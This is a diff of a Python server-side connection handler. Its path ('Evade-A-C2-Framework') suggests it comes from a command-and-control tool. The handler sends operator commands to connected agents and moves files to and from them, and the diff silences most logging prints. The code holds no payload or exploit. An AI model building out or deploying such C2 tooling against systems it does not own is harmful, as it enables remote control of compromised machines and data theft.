@@ -22,9 +22,6 @@ for i in range(20):
     CMD_OUTPUT.append('')
     IPS.append('')
 
-import os
-import socket
-
 def handle_conn(connection, address, thread_index):
     global CMD_INPUT
     global CMD_OUTPUT
@@ -39,12 +36,12 @@ def handle_conn(connection, address, thread_index):
                 if CMD_INPUT[thread_index].split(" ")[0] == 'download':
                     filename = CMD_INPUT[thread_index].split(" ")[1]
                     cmd = CMD_INPUT[thread_index]
-                    print(f"Sending command to client: {cmd}")
+                    #print(f"Sending command to client: {cmd}")
                     connection.send(cmd.encode())
                     
                     # Check if the file exists on the agent side
                     agent_response = connection.recv(2048).decode()
-                    print(f"Received response from client: {agent_response}")
+                    #print(f"Received response from client: {agent_response}")
                     if agent_response.startswith("Error"):
                         CMD_OUTPUT[thread_index] = agent_response
                         CMD_INPUT[thread_index] = ''
@@ -57,7 +54,7 @@ def handle_conn(connection, address, thread_index):
                         try:
                             with open(file_path, 'wb') as f:
                                 f.write(contents)
-                            print("File written successfully.")
+                            #print("File written successfully.")
                             CMD_OUTPUT[thread_index] = 'File Transfer Successful.'
                         except IOError as e:
                             CMD_OUTPUT[thread_index] = f"Error: Unable to write file - {e}"
@@ -65,16 +62,14 @@ def handle_conn(connection, address, thread_index):
                     
                 elif CMD_INPUT[thread_index].split(" ")[0] == 'upload':
                     filename = CMD_INPUT[thread_index].split(" ")[1]
-                    cmd = CMD_INPUT[thread_index]
-                    print(f"Sending command to client: {cmd}")
-                    connection.send(cmd.encode())
-                    upload_dir = 'E:\\Github\\Repos\\Evade-A-C2-Framework\\output'
+                    upload_dir = 'E:\\Github\\Repos\\Evade-A-C2-Framework\\upload'
                     file_path = os.path.join(upload_dir, filename)
                     if os.path.exists(file_path):
-                        with open(file_path, 'rb') as f:
-                            contents = f.read()
-                        connection.send(contents) 
-                        print("File sent to client.")
+                    #if os.path.exists(file_path) and os.path.isfile(filename) and os.path.getsize(filename) > 0:
+                        # Send the command to the client
+                        cmd = CMD_INPUT[thread_index]
+                        connection.send(cmd.encode())
+                        # Wait for acknowledgment from the client
                         response = connection.recv(2048).decode()
                         print(f"Received response from client: {response}")
                         if response.startswith("File"):
@@ -89,16 +84,13 @@ def handle_conn(connection, address, thread_index):
                    
                 else:
                     msg = CMD_INPUT[thread_index]
-                    print(f"Sending message to client: {msg}")
+                    #print(f"Sending message to client: {msg}")
                     connection.send(msg.encode())
                     CMD_INPUT[thread_index] = ''
                     break
                 
     active_connections -= 1
     connection_sakkaune(connection)
-
-
-
 
 def connection_sakkaune(connection):
     connection.close()
